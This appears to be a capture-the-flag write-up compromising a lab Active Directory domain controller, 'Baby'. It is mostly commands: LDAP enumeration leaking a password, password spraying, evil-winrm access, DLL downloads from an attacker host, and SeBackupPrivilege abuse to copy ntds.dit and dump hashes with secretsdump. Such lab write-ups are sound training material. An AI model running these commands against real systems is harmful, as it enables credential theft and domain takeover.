# KEY TAKE AWAYS

* **LDAP search**
*  **smbpasswd**
* **SeBackupPrivileges Privilege Escalation**

# NMAP

```
PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-05-02 11:09:49Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
|_ssl-date: 2024-05-02T11:10:38+00:00; +1m24s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-02T11:09:58+00:00
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Issuer: commonName=BabyDC.baby.vl
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        syn-ack .NET Message Framing
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# LDAP Search

Turns out that smb and the http service have no information to contribute towards the enumeration

```
ldapsearch -h $IP -x -b "" -s base \* +
```
 gives

```
NetBIOS computer name: BABYDC
NetBIOS domain name: BABY
DNS domain: baby.vl
FQDN: BabyDC.baby.vl
Derived membership: domain member
Derived domain: BABY 
```

```
ldapsearch -x -H ldap://$IP -s base namingcontexts
```

gives

```
namingcontexts: DC=baby,DC=vl
namingcontexts: CN=Configuration,DC=baby,DC=vl
namingcontexts: CN=Schema,CN=Configuration,DC=baby,DC=vl
namingcontexts: DC=DomainDnsZones,DC=baby,DC=vl
namingcontexts: DC=ForestDnsZones,DC=baby,DC=vl
```

we can now dump the usernames

```
ldapsearch -x -b "dc=baby,dc=vl" -H ldap://$IP '(ObjectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
```
dumping everything available on that LDAP server results in leaking a preset password

```
ldapsearch -x -b "dc=baby,dc=vl" -H ldap://$IP
```
[Reference](https://github.com/nirajkharel/AD-Pentesting-Notes)

# User Own

Using Crackmapexec to passwordspray against the known users results in getting the user own

```
crackmapexec smb -u users.txt -p ‘’  $IP
```

but since the preset password is not changed we have to change it via smbpasswd

```
smbpasswd -r $IP -U <compromised-user>
```

userown

```
evil-winrm -u <compromised-user>  -p 'P@$$W0Rd'  -i $IP
```

# Privilege Escalation

```
whoami /priv 
```
This reveals that we have SeBackupPrivileges

As mentioned in this [Link](https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/)

we can git clone the necessary dll's from [here](https://github.com/giuliano108/SeBackupPrivilege/tree/master)

```
# If powershell
Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeUtils.dll -OutFile .\SeBackupPrivilegeUtils.dll
Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeCmdLets.dll -OutFile .\SeBackupPrivilegeCmdLets.dll

# If winrm
upload SeBackupPrivilegeUtils.dll
upload SeBackupPrivilegeCmdLets.dll

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege

Copy-FileSeBackupPrivilege .\root.txt C:\Users\<compromised-user>\Desktop\root.txt  -Overwrite
Copy-FileSeBackupPrivilege C:\Users\Administrator\root.txt C:\Users\Public\flag.txt -Overwrite
```

To get Administrator Shell

```
Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\tmp\ntds.dit -overwrite

reg save HKLM\SYSTEM c:\tmp\system

download ntds.dit
download system

impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

Now use the cracked hash via evil-winrm to get the administrator shell
